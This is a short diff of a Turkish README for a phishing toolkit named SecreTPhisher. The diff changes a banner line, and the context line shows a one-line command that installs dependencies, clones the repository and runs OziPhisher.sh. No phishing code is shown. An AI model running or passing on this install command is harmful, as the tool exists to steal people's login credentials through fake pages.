@@ -17,7 +17,7 @@ Tek Komut :
 apt update ; apt install git curl php openssh -y ; git clone git://github.com/SecreTOzi/SecreTPhisher ; cd SecreTPhisher ; bash OziPhisher.sh
 
  
-<<< Eğer kopyalarsan, o zaman bana Kredi Ver Bladerrr:))!!!!! >>>
+<<< VARLIĞIM TÜRK VARLIĞINA ARMAĞAN OLSUN!!! >>>
 
 Özellikleri :
 
